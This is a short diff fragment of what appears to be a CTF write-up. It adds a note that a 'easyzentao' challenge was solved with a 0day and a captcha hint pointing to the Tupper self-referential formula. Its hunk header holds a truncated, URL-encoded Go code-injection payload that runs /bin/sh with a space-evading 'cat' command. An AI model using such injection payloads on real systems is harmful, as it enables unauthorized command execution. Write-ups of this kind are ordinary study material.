@@ -92,4 +92,10 @@ os/exec"%0a"fmt")%0afunc%09init()%7B%0acmd:=exec.Command("/bin/sh","-c","cat${IF
 
 
 ### easyzentao
+0day
+
+## Misc
+### 验证码
+hint是 tupper
+这里指的的tupper自指公式
 
